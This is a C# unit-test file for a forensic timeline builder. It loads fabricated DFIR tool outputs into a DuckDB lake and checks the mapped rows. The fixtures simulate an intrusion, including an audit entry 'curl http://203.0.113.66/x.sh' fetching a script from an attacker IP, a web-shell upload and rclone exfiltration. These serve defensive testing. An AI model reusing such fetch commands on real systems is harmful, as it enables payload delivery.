using static ArtefactForge.Lake.Tests.Fixtures;

namespace ArtefactForge.Lake.Tests;

/// <summary>
/// One made-up file per kind, with the header the real tool writes (taken from its output), built
/// into a lake as a folder without outputs.json, and the timeline rows it gives checked.
/// </summary>
public sealed class KindMappingTests
{
    private static readonly LakeOptions Small = new() { MemoryLimitBytes = 512L * 1024 * 1024, Threads = 2 };

    private static Dictionary<string, string> Row(params (string Column, string Value)[] cells) =>
        cells.ToDictionary(c => c.Column, c => c.Value);

    /// <summary>Builds a lake from one file at HOST01\<paramref name="relativePath"/> and returns its timeline rows.</summary>
    private static (LakeResult Result, List<Dictionary<string, object?>> Rows) Build(string relativePath, string csv,
        string query = "SELECT * FROM timeline ORDER BY ts")
    {
        using var temp = new TempDirectory();
        temp.Write(Path.Combine("HOST01", relativePath), csv);
        var result = LakeBuilder.Build(temp.Path, Small);
        using var lake = OpenLake(Path.Combine(temp.Path, "_Lake", "case.duckdb"));
        return (result, Rows(lake, query));
    }

    private static string[] H(string header) => header.Split(',');

    [Fact]
    public void Amcache_file_entries_carry_the_sha1_without_the_old_formats_leading_zeros()
    {
        var csv = Csv(H("ApplicationName,ProgramId,FileKeyLastWriteTimestamp,SHA1,IsOsComponent,FullPath,Name,FileExtension,LinkDate,ProductName,Size,Version,ProductVersion,LongPathHash,BinaryType,IsPeFile,BinFileVersion,BinProductVersion,Usn,Language,Description,OriginalFileName"),
            Row(("ApplicationName", "Unassociated"), ("FileKeyLastWriteTimestamp", "2026-11-01 09:20:00"), ("SHA1", "0000ABCDEF0123456789ABCDEF0123456789ABCDEF01"),
                ("IsOsComponent", "False"), ("FullPath", @"c:\users\alice\appdata\local\temp\updater.exe"), ("Name", "updater.exe"),
                ("FileExtension", ".exe"), ("Size", "73728")));

        var (result, rows) = Build(@"Amcache\Amcache_UnassociatedFileEntries.csv", csv);

        Assert.Equal("amcache.files", Assert.Single(result.Sources).Kind);
        var row = Assert.Single(rows);
        Assert.Equal("abcdef0123456789abcdef0123456789abcdef01", row["sha1"]);
        Assert.Equal("updater.exe", row["file_name"]);
        Assert.Equal("execution", row["category"]);
        Assert.Equal(73728L, row["size"]);
    }

    [Fact]
    public void ShimCache_entries_are_run_only_where_Windows_recorded_execution()
    {
        var csv = Csv(H("ControlSet,CacheEntryPosition,Path,LastModifiedTimeUTC,Executed,Duplicate,SourceFile"),
            Row(("ControlSet", "1"), ("CacheEntryPosition", "0"), ("Path", @"C:\Tools\a.exe"), ("LastModifiedTimeUTC", "2026-10-01 10:00:00"), ("Executed", "Yes"), ("Duplicate", "False")),
            Row(("ControlSet", "1"), ("CacheEntryPosition", "1"), ("Path", @"C:\Tools\b.exe"), ("LastModifiedTimeUTC", "2026-10-02 10:00:00"), ("Executed", "No"), ("Duplicate", "False")),
            Row(("ControlSet", "1"), ("CacheEntryPosition", "2"), ("Path", @"C:\Tools\c.exe"), ("LastModifiedTimeUTC", ""), ("Executed", "NA"), ("Duplicate", "False")));

        var (result, rows) = Build(@"ShimCache\AppCompatCacheParser_Windows10C_11_SYSTEM_AppCompatCache.csv", csv);

        Assert.Equal(["run", "present"], rows.Select(r => (string)r["action"]!));
        Assert.Equal(0, Assert.Single(result.Sources).TimeUnread);   // an entry with no time is not a problem
    }

    [Fact]
    public void LNK_files_give_a_first_and_a_last_opening_with_the_profiles_user()
    {
        var csv = Csv(H("SourceFile,SourceCreated,SourceModified,SourceAccessed,TargetCreated,TargetModified,TargetAccessed,FileSize,RelativePath,WorkingDirectory,FileAttributes,HeaderFlags,DriveType,VolumeSerialNumber,VolumeLabel,LocalPath,NetworkPath,CommonPath,Arguments,TargetIDAbsolutePath,TargetMFTEntryNumber,TargetMFTSequenceNumber,MachineID,MachineMACAddress,MACVendor,TrackerCreatedOn,ExtraBlocksPresent"),
            Row(("SourceFile", @"C:\Users\alice\AppData\Roaming\Microsoft\Windows\Recent\plan.docx.lnk"), ("SourceCreated", "2026-11-01 09:00:00"),
                ("SourceModified", "2026-11-02 09:00:00"), ("FileSize", "1024"), ("LocalPath", @"C:\Users\alice\Documents\plan.docx"), ("MachineID", "host01")));

        var (_, rows) = Build(@"LNKFiles\alice\alice_LECmd_Recent.csv", csv);

        Assert.Equal(["first_opened", "last_opened"], rows.Select(r => (string)r["ts_desc"]!));
        Assert.All(rows, r => Assert.Equal("alice", r["user_name"]));
        Assert.Equal(".docx", rows[0]["extension"]);
    }

    [Fact]
    public void Jump_lists_give_each_entrys_last_use_and_custom_destinations_their_files_change()
    {
        var auto = Csv(H("SourceFile,SourceCreated,SourceModified,SourceAccessed,AppId,AppIdDescription,HasSps,DestListVersion,LastUsedEntryNumber,MRU,EntryNumber,CreationTime,LastModified,Hostname,MacAddress,Path,InteractionCount,PinStatus,FileBirthDroid,FileDroid,VolumeBirthDroid,VolumeDroid,TargetCreated,TargetModified,TargetAccessed,FileSize,RelativePath,WorkingDirectory,FileAttributes,HeaderFlags,DriveType,VolumeSerialNumber,VolumeLabel,LocalPath,CommonPath,TargetIDAbsolutePath,TargetMFTEntryNumber,TargetMFTSequenceNumber,MachineID,MachineMACAddress,TrackerCreatedOn,ExtraBlocksPresent,Arguments,Notes"),
            Row(("SourceFile", @"C:\Users\alice\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\1b.automaticDestinations-ms"),
                ("AppId", "1b"), ("AppIdDescription", "Notepad"), ("EntryNumber", "1"), ("LastModified", "2026-11-01 10:00:00"),
                ("LocalPath", @"C:\Users\alice\notes.txt"), ("InteractionCount", "3"), ("FileSize", "10")));
        var (_, autoRows) = Build(@"JumpLists\alice\alice_JLECmd_AutomaticDestinations.csv", auto);
        var row = Assert.Single(autoRows);
        Assert.Equal("last_used", row["ts_desc"]);
        Assert.Contains("Notepad", (string)row["summary"]!);

        var custom = Csv(H("SourceFile,SourceCreated,SourceModified,SourceAccessed,AppId,AppIdDescription,EntryName,TargetCreated,TargetModified,TargetAccessed,FileSize,RelativePath,WorkingDirectory,FileAttributes,HeaderFlags,DriveType,VolumeSerialNumber,VolumeLabel,LocalPath,CommonPath,TargetIDAbsolutePath,TargetMFTEntryNumber,TargetMFTSequenceNumber,MachineID,MachineMACAddress,TrackerCreatedOn,ExtraBlocksPresent,Arguments"),
            Row(("SourceFile", @"C:\Users\alice\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\2c.customDestinations-ms"),
                ("SourceModified", "2026-11-01 11:00:00"), ("AppId", "2c"), ("LocalPath", @"C:\Tools\tool.exe")));
        var (_, customRows) = Build(@"JumpLists\alice\alice_JLECmd_CustomDestinations.csv", custom);
        Assert.Equal("jumplist_modified", Assert.Single(customRows)["ts_desc"]);
    }

    [Fact]
    public void ShellBags_with_interaction_times_are_folders_browsed_and_the_rest_stay_raw()
    {
        var csv = Csv(H("BagPath,Slot,NodeSlot,MRUPosition,AbsolutePath,ShellType,Value,ChildBags,CreatedOn,ModifiedOn,AccessedOn,LastWriteTime,MFTEntry,MFTSequenceNumber,ExtensionBlockCount,FirstInteracted,LastInteracted,HasExplored,Miscellaneous,SourceFile"),
            Row(("BagPath", "BagMRU\\0"), ("Slot", "1"), ("AbsolutePath", @"My Computer\C:\Finance"), ("ShellType", "Directory"), ("Value", "Finance"),
                ("FirstInteracted", "2026-11-01 08:00:00"), ("LastInteracted", "2026-11-01 09:00:00"), ("HasExplored", "True"),
                ("SourceFile", @"C:\Users\alice\AppData\Local\Microsoft\Windows\UsrClass.dat")),
            Row(("BagPath", "BagMRU\\1"), ("Slot", "2"), ("AbsolutePath", "Desktop"), ("ShellType", "Root folder: GUID"), ("Value", "Desktop")));

        var (_, rows) = Build(@"ShellBags\alice\alice_SBECmd_Deduplicated.csv", csv);

        Assert.Equal(2, rows.Count);
        Assert.All(rows, r => Assert.Equal("browse", r["action"]));
        Assert.All(rows, r => Assert.Equal("alice", r["user_name"]));
    }

    [Fact]
    public void BAM_rows_are_runs_with_the_volume_dropped_and_the_SID_from_the_key()
    {
        var csv = Csv(H("Program,BatchKeyPath,ExecutionTime,BatchValueName"),
            Row(("Program", @"\Device\HarddiskVolume4\Windows\System32\cmd.exe"),
                ("BatchKeyPath", @"ROOT\ControlSet001\Services\bam\State\UserSettings\S-1-5-21-1000-1000-1000-1001"),
                ("ExecutionTime", "2026-11-01 09:30:00.1234567"), ("BatchValueName", "x")));

        var (_, rows) = Build(@"Registry\RECmd_SYSTEM_BamDam.csv", csv);

        var row = Assert.Single(rows);
        Assert.Equal(@"\Windows\System32\cmd.exe", row["path"]);
        Assert.Equal("S-1-5-21-1000-1000-1000-1001", row["user_sid"]);
        Assert.Equal("run", row["action"]);
    }

    private const string BatchHeader =
        "HivePath,HiveType,Description,Category,KeyPath,ValueName,ValueType,ValueData,ValueData2,ValueData3,Comment,Recursive,Deleted,LastWriteTimestamp,PluginDetailFile";

    [Fact]
    public void Autoruns_are_persistence_rows_but_another_RECmd_batch_with_the_same_header_is_not()
    {
        var csv = Csv(H(BatchHeader),
            Row(("HivePath", @"C:\Users\alice\NTUSER.DAT"), ("HiveType", "NtUser"), ("Description", "Run"), ("Category", "Autoruns"),
                ("KeyPath", @"ROOT\Software\Microsoft\Windows\CurrentVersion\Run"), ("ValueName", "updater"),
                ("ValueData", @"C:\Users\alice\AppData\Local\Temp\updater.exe"), ("Deleted", "False"), ("LastWriteTimestamp", "2026-11-01 09:21:00")));
        using var temp = new TempDirectory();
        temp.Write(@"HOST01\Registry\RECmd_SYSTEM_Autoruns.csv", csv);
        temp.Write(@"HOST01\Registry\RECmd_SYSTEM.csv", csv);

        var result = LakeBuilder.Build(temp.Path, Small);

        Assert.Equal("recmd.autoruns", result.Sources.Single(s => s.Path.EndsWith("_Autoruns.csv")).Kind);
        Assert.Equal("unmapped.recmd_system", result.Sources.Single(s => s.Path.EndsWith("RECmd_SYSTEM.csv")).Kind);
        using var lake = OpenLake(Path.Combine(temp.Path, "_Lake", "case.duckdb"));
        var row = Assert.Single(Rows(lake, "SELECT * FROM timeline"));
        Assert.Equal("persistence", row["category"]);
        Assert.Equal("alice", row["user_name"]);
        Assert.Equal(@"C:\Users\alice\AppData\Local\Temp\updater.exe", row["command_line"]);
    }

    [Fact]
    public void SRUM_network_usage_gives_bytes_out_per_program_and_app_use_is_an_execution()
    {
        var net = Csv(H("Id,Timestamp,ExeInfo,ExeInfoDescription,ExeTimestamp,SidType,Sid,UserName,UserId,AppId,BytesReceived,BytesSent,InterfaceLuid,InterfaceType,L2ProfileFlags,L2ProfileId,ProfileName"),
            Row(("Id", "1"), ("Timestamp", "2026-11-01 10:00:00"), ("ExeInfo", @"\device\harddiskvolume4\program files\rclone\rclone.exe"),
                ("Sid", "S-1-5-21-1000-1000-1000-1001"), ("UserName", "alice"), ("AppId", "7"), ("BytesReceived", "1000"), ("BytesSent", "5000000000"),
                ("InterfaceType", "IF_TYPE_ETHERNET_CSMACD")));
        var (_, netRows) = Build(@"SRUM\SrumECmd_NetworkUsages_Output.csv", net, "SELECT * FROM network_usage");
        var row = Assert.Single(netRows);
        Assert.Equal(5_000_000_000L, row["bytes_out"]);
        Assert.Equal("rclone.exe", row["program"]);
        Assert.Equal(@"\program files\rclone\rclone.exe", row["process_path"]);

        var app = Csv(H("Id,Timestamp,ExeInfo,ExeInfoDescription,ExeTimestamp,SidType,Sid,UserName,UserId,AppId,BackgroundBytesRead,BackgroundBytesWritten,BackgroundContextSwitches,BackgroundCycleTime,BackgroundNumberOfFlushes,BackgroundNumReadOperations,BackgroundNumWriteOperations,FaceTime,ForegroundBytesRead,ForegroundBytesWritten,ForegroundContextSwitches,ForegroundCycleTime,ForegroundNumberOfFlushes,ForegroundNumReadOperations,ForegroundNumWriteOperations"),
            Row(("Id", "2"), ("Timestamp", "2026-11-01 10:00:00"), ("ExeInfo", @"\device\harddiskvolume4\program files\rclone\rclone.exe"),
                ("UserName", "alice"), ("ForegroundBytesRead", "100"), ("BackgroundBytesRead", "20"), ("ForegroundBytesWritten", "5")));
        var (_, appRows) = Build(@"SRUM\SrumECmd_AppResourceUseInfo_Output.csv", app);
        var use = Assert.Single(appRows);
        Assert.Equal("execution", use["category"]);
        Assert.Contains("read 120, wrote 5 bytes on disk", (string)use["summary"]!);
    }

    [Fact]
    public void Recycle_Bin_deletes_carry_the_deleting_SID()
    {
        var csv = Csv(H("SourceName,FileType,FileName,FileSize,DeletedOn"),
            Row(("SourceName", @"C:\$Recycle.Bin\S-1-5-21-1000-1000-1000-1001\$I1A2B3C.docx"), ("FileType", "$I"),
                ("FileName", @"C:\Users\alice\Documents\plan.docx"), ("FileSize", "2048"), ("DeletedOn", "2026-11-01 12:00:00")));

        var (_, rows) = Build(@"RecycleBin\RBCmd_RecycleBin.csv", csv);

        var row = Assert.Single(rows);
        Assert.Equal("delete", row["action"]);
        Assert.Equal("S-1-5-21-1000-1000-1000-1001", row["user_sid"]);
        Assert.Equal("alice", row["user_name"]);
    }

    [Fact]
    public void Hayabusa_hits_from_either_time_format_and_a_minimal_profile_are_detections_in_UTC()
    {
        // The minimal profile's columns, in its order; the verbose ones are optional.
        var csv = "\"Timestamp\",\"Computer\",\"Channel\",\"EventID\",\"Level\",\"RuleTitle\",\"Details\"\r\n" +
                  "\"2026-11-01 10:00:00.123 +02:00\",\"HOST01\",\"Sec\",4625,\"med\",\"Logon Failure\",\"User: alice\"\r\n" +
                  "\"2026-11-01T09:00:00.000Z\",\"HOST01\",\"Sec\",4624,\"crit\",\"Admin Logon\",\"\"\r\n" +
                  "\"01/11/2026 09:00\",\"HOST01\",\"Sec\",1,\"info\",\"Odd time\",\"\"\r\n";

        var (result, rows) = Build(@"EventLogs\Hayabusa_Timeline.csv", csv, "SELECT * FROM detections ORDER BY ts");

        Assert.Equal(2, rows.Count);
        Assert.Equal(new DateTime(2026, 11, 1, 8, 0, 0, 123), rows[0]["ts"]);
        Assert.Equal("medium", rows[0]["severity"]);
        Assert.Equal("critical", rows[1]["severity"]);
        var source = Assert.Single(result.Sources);
        Assert.Equal(1, source.TimeUnread);   // the time it could not read is counted, not lost
        Assert.True(source.NeedsReview);
    }

    [Fact]
    public void Chainsaw_hits_are_detections_with_the_events_ID()
    {
        var csv = Csv(H("timestamp,detections,path,count,Event.System.Provider,Event ID,Record ID,Computer,Event Data"),
            Row(("timestamp", "2026-11-01T10:00:00.000000+00:00"), ("detections", "Security Log Cleared"),
                ("path", @"C:\Windows\System32\winevt\Logs\Security.evtx"), ("count", "1"),
                ("Event.System.Provider", "Microsoft-Windows-Eventlog"), ("Event ID", "1102"), ("Computer", "HOST01")));

        var (_, rows) = Build(@"EventLogs\Chainsaw_sigma.csv", csv, "SELECT * FROM detections");

        var row = Assert.Single(rows);
        Assert.Equal("Security Log Cleared", row["rule_title"]);
        Assert.Equal(1102, row["event_id"]);
        Assert.Equal("Microsoft-Windows-Eventlog", row["provider"]);
    }

    private const string AuthHeader = "Timestamp,TimestampUtc,RawTime,YearInferred,Host,Process,PID,Event,User,SourceIP,Command,Message,SourceFile";

    [Fact]
    public void Linux_auth_rows_with_only_the_hosts_local_time_stay_raw_and_flag_the_source()
    {
        var csv = Csv(H(AuthHeader),
            Row(("Timestamp", "2026-11-01 13:00:00"), ("TimestampUtc", "2026-11-01 12:00:00"), ("RawTime", "2026-11-01T13:00:00+01:00"),
                ("YearInferred", ""), ("Host", "web01"), ("Process", "sshd"), ("Event", "LoginSuccess"), ("User", "alice"), ("SourceIP", "192.0.2.10"),
                ("Message", "Accepted publickey for alice")),
            Row(("Timestamp", "2026-11-01 14:00:00"), ("TimestampUtc", ""), ("RawTime", "Nov  1 14:00:00"), ("YearInferred", "yes"),
                ("Host", "web01"), ("Process", "sshd"), ("Event", "LoginFailed"), ("User", "root"), ("SourceIP", "203.0.113.66")));

        var (result, rows) = Build(@"Auth\LinuxAuth_Events.csv", csv, "SELECT * FROM logons");

        var row = Assert.Single(rows);
        Assert.Equal("logon_success", row["action"]);
        Assert.Equal("192.0.2.10", row["src_ip"]);
        var source = Assert.Single(result.Sources);
        Assert.Equal(1, source.TimeUnread);
        Assert.Contains("only the host's local time", source.Reason);
        Assert.Equal(LakeOutcome.BuiltCheckLog, result.Outcome);
    }

    [Fact]
    public void Linux_auth_key_events_with_the_same_header_are_kept_raw_so_no_logon_is_counted_twice()
    {
        var csv = Csv(H(AuthHeader),
            Row(("TimestampUtc", "2026-11-01 12:00:00"), ("Event", "LoginSuccess"), ("User", "alice"), ("Message", "x")));
        using var temp = new TempDirectory();
        temp.Write(@"HOST01\Auth\LinuxAuth_Events.csv", csv);
        temp.Write(@"HOST01\Auth\LinuxAuth_KeyEvents.csv", csv);

        var result = LakeBuilder.Build(temp.Path, Small);

        Assert.Equal("unmapped.linuxauth_keyevents", result.Sources.Single(s => s.Path.EndsWith("KeyEvents.csv")).Kind);
        using var lake = OpenLake(Path.Combine(temp.Path, "_Lake", "case.duckdb"));
        Assert.Equal(1L, Scalar(lake, "SELECT count(*) FROM logons"));
    }

    [Fact]
    public void Journal_syslog_audit_web_logins_and_bodyfile_rows_map_into_the_timeline()
    {
        using var temp = new TempDirectory();
        temp.Write(@"HOST01\Journal\LinuxJournal_Entries.csv", Csv(H("TimestampUtc,Hostname,Priority,SyslogIdentifier,PID,UID,Comm,Unit,SubjectUnit,Transport,Message,Exe,CommandLine,BootId,Seqnum,SourceFile"),
            Row(("TimestampUtc", "2026-11-01 06:00:00.000000"), ("Priority", "info"), ("SyslogIdentifier", "systemd"), ("PID", "1"), ("Message", "Started sshd"), ("Exe", "/usr/lib/systemd/systemd"))));
        temp.Write(@"HOST01\Journal\LinuxJournal_Auth.csv", Csv(H("TimestampUtc,Host,Process,PID,Event,User,SourceIP,Command,Message,SourceFile"),
            Row(("TimestampUtc", "2026-11-01 06:01:00.000000"), ("Process", "sudo"), ("Event", "SudoCommand"), ("User", "alice"), ("Command", "/bin/bash"), ("Message", "sudo"))));
        temp.Write(@"HOST01\Syslog\LinuxSyslog_Events.csv", Csv(H("Timestamp,TimestampUtc,YearInferred,RawTime,Host,Process,PID,Message,Log,SourceFile"),
            Row(("TimestampUtc", "2026-11-01 06:02:00"), ("Process", "kernel"), ("Message", "eth0 up"), ("Log", "syslog"))));
        temp.Write(@"HOST01\Audit\LinuxAudit_Events.csv", Csv(H("TimestampUtc,EventId,RecordTypes,Syscall,Success,Exit,PID,PPID,AuditUser,User,EffectiveUser,Exe,Comm,CommandLine,Cwd,Paths,Key,Terminal,Session,Operation,Account,Address,Result,SourceFile"),
            Row(("TimestampUtc", "2026-11-01 06:03:00"), ("RecordTypes", "SYSCALL,EXECVE,CWD,PATH"), ("Syscall", "execve"), ("Success", "yes"),
                ("AuditUser", "alice"), ("Exe", "/usr/bin/curl"), ("CommandLine", "curl http://203.0.113.66/x.sh"))));
        temp.Write(@"HOST01\WebLogs\LinuxWebLogs_Access.csv", Csv(H("TimestampUtc,RawTime,Server,VHost,ClientIP,User,Method,Url,Protocol,Status,Bytes,Referer,UserAgent,Flags,SourceFile,Line"),
            Row(("TimestampUtc", "2026-11-01 06:04:00"), ("Server", "nginx"), ("ClientIP", "203.0.113.66"), ("Method", "POST"), ("Url", "/upload.php"),
                ("Status", "200"), ("Bytes", "512"), ("UserAgent", "curl/8.5.0"), ("Flags", "WebShell"))));
        temp.Write(@"HOST01\Logins\LinuxLogins_btmp.csv", Csv(H("TimestampUtc,Type,User,Terminal,Host,PID,Source"),
            Row(("TimestampUtc", "2026-11-01 06:05:00"), ("Type", "LOGIN_PROCESS"), ("User", "admin"), ("Terminal", "ssh:notty"), ("Host", "203.0.113.66"), ("PID", "2000"), ("Source", "btmp"))));
        temp.Write(@"HOST01\Bodyfile\LinuxBodyfile_Timeline.csv", Csv(H("TimestampUtc,MACB,Path,LinkTarget,Size,Mode,User,Group,Inode,SourceFile"),
            Row(("TimestampUtc", "2026-11-01 06:06:00"), ("MACB", "m.cb"), ("Path", "/var/www/html/upload.php"), ("Size", "300"), ("Mode", "-rw-r--r--"), ("User", "www-data"))));

        var result = LakeBuilder.Build(temp.Path, Small);

        Assert.Equal(LakeOutcome.Built, result.Outcome);
        using var lake = OpenLake(Path.Combine(temp.Path, "_Lake", "case.duckdb"));
        var byKind = Rows(lake, "SELECT kind, category, action, src_ip, url, http_status, path, user_name, platform FROM timeline")
            .ToDictionary(r => (string)r["kind"]!);
        Assert.Equal("system", byKind["linux.journal"]["category"]);
        Assert.Equal("run", byKind["linux.journal_auth"]["action"]);
        Assert.Equal("system", byKind["linux.syslog"]["category"]);
        Assert.Equal("process", byKind["linux.audit"]["category"]);
        Assert.Equal("/usr/bin/curl", byKind["linux.audit"]["path"]);
        Assert.Equal("/upload.php", byKind["linux.weblogs"]["url"]);
        Assert.Equal(200, byKind["linux.weblogs"]["http_status"]);
        Assert.Equal("logon_fail", byKind["linux.logins"]["action"]);
        Assert.Equal("203.0.113.66", byKind["linux.logins"]["src_ip"]);
        Assert.Equal("create", byKind["linux.bodyfile"]["action"]);
        Assert.All(byKind.Values, r => Assert.Equal("linux", r["platform"]));
    }

    [Fact]
    public void ArtefactForges_own_results_are_loaded_raw_and_its_case_files_with_host_case()
    {
        using var temp = new TempDirectory();
        temp.Write(@"HOST01\Ransomware\RansomwareSummary.csv",
            "\"Collection\",\"Host\",\"Status\",\"Extension\",\"ExtensionBasis\",\"NoteName\",\"NoteBasis\",\"NoteSize\",\"NoteSha256\",\"NoteCopy\",\"NoteFolders\",\"StartUtc\",\"StartIsEarliestSeen\",\"FinishUtc\",\"FilesAffected\",\"RatePerMinute\",\"PeakPerMinute\",\"Source\",\"Differences\",\"Detail\",\"Parameters\"\r\n" +
            "\"HOST01\",\"HOST01\",\"Found\",\".lockbit\",\"Detected\",\"\",\"\",\"\",\"\",\"\",\"\",\"2026-11-01 09:00:00\",\"False\",\"2026-11-01 09:15:00\",\"360\",\"24\",\"28\",\"USN\",\"\",\"\",\"v1\"\r\n");
        temp.Write("IocHits.csv", "\"IocType\",\"Ioc\",\"Host\",\"Module\",\"Time\",\"OutputFile\",\"LineNumber\",\"MatchingLine\"\r\n" +
                                  "\"file\",\"updater.exe\",\"HOST01\",\"PECmd\",\"\",\"x.csv\",\"2\",\"UPDATER.EXE\"\r\n");
        temp.Write("Unrelated.csv", "A,B\r\n1,2\r\n");

        var result = LakeBuilder.Build(temp.Path, Small);

        Assert.Equal(LakeOutcome.Built, result.Outcome);
        Assert.Equal(["HOST01"], result.Hosts);
        Assert.Equal("af.ransomware_summary", result.Sources.Single(s => s.Host == "HOST01").Kind);
        var hits = Assert.Single(result.Sources, s => s.Host == "(case)");
        Assert.Equal("af.ioc_hits", hits.Kind);
        Assert.Equal(1, hits.RowsLoaded);
        using var lake = OpenLake(Path.Combine(temp.Path, "_Lake", "case.duckdb"));
        Assert.Equal(".lockbit", Scalar(lake, "SELECT Extension FROM raw_af_ransomware_summary"));
        Assert.Equal(0L, Scalar(lake, "SELECT count(*) FROM timeline"));
        Assert.Null(Scalar(lake, "SELECT mapping FROM sources WHERE kind = 'af.ioc_hits'"));
    }

    [Fact]
    public void Times_with_an_offset_are_read_in_UTC_whatever_the_machines_zone()
    {
        using var temp = new TempDirectory();
        temp.Write(@"HOST01\EventLogs\Hayabusa_Timeline.csv",
            "\"Timestamp\",\"RuleTitle\",\"Level\",\"Computer\",\"Channel\",\"EventID\"\r\n\"2026-07-01 12:00:00.000 -05:00\",\"x\",\"low\",\"H\",\"Sec\",1\r\n");
        LakeBuilder.Build(temp.Path, Small);

        using var lake = OpenLake(Path.Combine(temp.Path, "_Lake", "case.duckdb"));
        Assert.Equal(new DateTime(2026, 7, 1, 17, 0, 0), Scalar(lake, "SELECT ts FROM timeline"));
        // The macro itself, as an analyst's own session (in any time zone) would use it.
        using (var command = lake.CreateCommand())
        {
            command.CommandText = "SET TimeZone = 'America/New_York'";
            command.ExecuteNonQuery();
        }
        Assert.Equal(new DateTime(2026, 7, 1, 17, 0, 0), Scalar(lake, "SELECT lake_ts_offset('2026-07-01 12:00:00 -05:00')"));
    }
}
